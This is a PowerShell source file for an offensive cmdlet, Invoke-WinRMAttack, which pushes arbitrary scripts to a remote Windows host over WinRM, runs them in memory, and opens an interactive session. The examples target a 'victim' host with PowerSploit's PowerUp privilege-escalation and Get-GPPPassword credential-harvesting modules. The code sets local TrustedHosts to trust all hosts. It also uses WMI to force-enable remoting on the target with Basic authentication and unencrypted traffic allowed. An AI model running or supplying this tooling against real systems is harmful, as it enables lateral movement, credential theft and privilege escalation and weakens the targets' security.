#Requires -version 2

function Invoke-WinRMAttack
{
    <#
            .Synopsis
            Push a PowerShell module to a remote system

            .Description
            This cmdlet will take a path to a single .ps1 script, Push it via the WINRM/PSREmoting communication channel and execute or install in memory

            .Parameter remote
            Target system

            .Parameter modulepath
            Full path to the module .ps1 script ot push to the remote system

            .Parameter creds
            Credentials to access the remote system

            .Parameter autoconnect
            Automatically connect to the remote PSSession

            Written by Dave Hardy, davehardy20@gmail.com @davehardy20
            Help from Ben Turner @benpturner

            Version 0.2.1

            .Example
            PS> Invoke-WinRMAttack -remote 192.168.134.10 -modulepath C:\Users\daveh\Documents\WindowsPowerShell\Modules\PowerSploit\Privesc\PowerUp.ps1 -creds

            Creating a PSSession to the Remote System
            Pushing the Module to the Remote System
            To connect to the session later, use Invoke-WinRMAttack -autoconnect

            Creates a New PSSession to the Remote system and Pushes the specified module via the remoting session communication channel and executes the script, in this case the PowerUp module.

            .Example
            PS> Invoke-WinRMAttack -remote 192.168.134.10 -modulepath C:\Users\daveh\Documents\WindowsPowerShell\Modules\PowerSploit\Exfiltration\Get-GPPPassword.ps1 -creds

            Remote Session exists
            Pushing the Module to the Remote System
            To connect to the session later, use Invoke-WinRMAttack -autoconnect

            Checks for the remote session and as it exists, just pushes the module to the remote system via the remoting communication channel.

            .Example
            PS> Invoke-WinRMAttack -remote 192.168.0.108 -creds -modulepath C:\Users\daveh\Documents\WindowsPowerShell\Modules\PowerSploit\Privesc\PowerUp.ps1 -autoconnect
            
            Creating a PSSession to the Remote System
            Pushing the Module to the Remote System
            Connecting to Remote Session

            Do everything and connect to the remote PSSession

    
            .Example
            PS> Invoke-WinRMAttack -remote 192.168.134.10 -creds -autoconnect
            Remote Session exists
            No module specified to push
            Connecting to Remote Session

            Connects to a remote session and allows the operator to run commands

            [192.168.134.10]: PS C:\Users\Administrator\Documents> get-help Invoke-AllChecks

            NAME
            Invoke-AllChecks
    
            SYNOPSIS
            Runs all functions that check for various Windows privilege escalation opportunities.
    
    
            SYNTAX
            Invoke-AllChecks [-HTMLReport] [<CommonParameters>]
    
    
            DESCRIPTION
    

            RELATED LINKS

            REMARKS
            To see the examples, type: "get-help Invoke-AllChecks -examples".
            For more information, type: "get-help Invoke-AllChecks -detailed".
            For technical information, type: "get-help Invoke-AllChecks -full".


    #>
	
	[cmdletbinding()]
	Param
	(
		[Parameter(Position = 0, Mandatory = $true,
				   HelpMessage = 'Remote System')]
		[ValidateNotNullorEmpty()]
		[Alias('victim')]
		[string]$remote,
		[Parameter(Mandatory = $false)]
		[Alias('module')]
		[string]$modulepath,
		[Parameter(Mandatory = $true,
				   HelpMessage = 'Switch to allow Remote System credentials')]
		[Alias('credentials')]
		[switch]$creds,
		[Parameter(Mandatory = $false)]
		[Alias('bind')]
		[switch]$autoconnect
		
	)

    $Script:remotesession = ''
    
    #Check for admin rights, elevate and set the trusted hosts to '*' ie trust all remote hosts
    function Set-TrustedHosts
    {
            If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator'))
            {   
          $arguments = 'Set-Item WSMan:localhost\client\trustedhosts -Force -value *'
          Start-Process -FilePath powershell -Verb runAs -ArgumentList $arguments
            }
    }

    #Test for local trusted hosts setting, only checks for '*' ie trust ALL remote hosts
    $trusted = Get-Item WSMan:\localhost\Client\TrustedHosts
    if ($trusted.Value -ne '*')
    {
        Write-Host -ForegroundColor Yellow "Your system is not configured to trust connection to ANY remote hosts`nWould you like me to configure this for you? (Admin privileges will be required)"
        $ans = Read-Host -Prompt 'yes or no'

        while("yes","no" -notcontains $ans)
        {
	    $ans = Read-Host -prompt 'yes or no'
        }
        if ($ans -eq 'yes')
        {
        Set-TrustedHosts
        }
        else
        {
        Write-Host -ForegroundColor Yellow "To configure this yourself, open Powershell as Administrator and enter the following;`n`n# Trust ALL remote hosts`nSet-Item WSMan:localhost\client\trustedhosts -value *`n`n#Trust Specified Hosts`nSet-Item WSMan:\localhost\Client\TrustedHosts -Value "machineA,machineB"`n"
        write-host -ForegroundColor Red "Cmdlet cannot continue - Exiting"
        Break
        }
    }

	if ($creds)
	{
		$creden = Get-Credential
	}
	function New-Session
	{
		Write-Output -InputObject 'Creating a PSSession to the Remote System'
		$Script:remotesession = New-PSSession -ComputerName $remote -Credential $creden -Name $remote
	}
	
	function Push-Module
	{
		Write-Output -InputObject 'Pushing the Module to the Remote System'
		Invoke-Command -Session $Script:remotesession -FilePath $modulepath
	}
	
	function Test-PsRemoting
	{
		$result = Invoke-Command -ComputerName $remote -Credential $creden -ScriptBlock {
			1
		}
		if ($result -ne 1)
		{
			Write-Output -InputObject 'PSRemoting is not enabled on' $remote ', I am going to try to enable it.'
			
			$command = 'cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True;Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force'
			Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $remote -Credential $creden -ArgumentList $command
		}
	}
	
	#Check if PSRemoting is already Enabled on the remote host
	Test-PsRemoting
	
	function Connect-Remote
	{
		Write-Output -InputObject 'Connecting to Remote Session'
		Enter-PSSession -Name $remote
	}
	
	
	if (!(Get-PSSession | Where-Object -FilterScript {
				$_.ComputerName -eq $remote
			}))
	{
		New-Session
	}
	Else
	{
		Write-Output -InputObject 'Remote Session exists'
	}
	
	If (($modulepath))
	{
		Push-Module
	}
	Else
	{
		Write-Output -InputObject 'No module specified to push'
	}
	
	if ($autoconnect)
	{
		Connect-Remote
	}
	Else
	{
		Write-Output -InputObject 'To connect to the session later, use Invoke-WinRMAttack -autoconnect'
	}
}
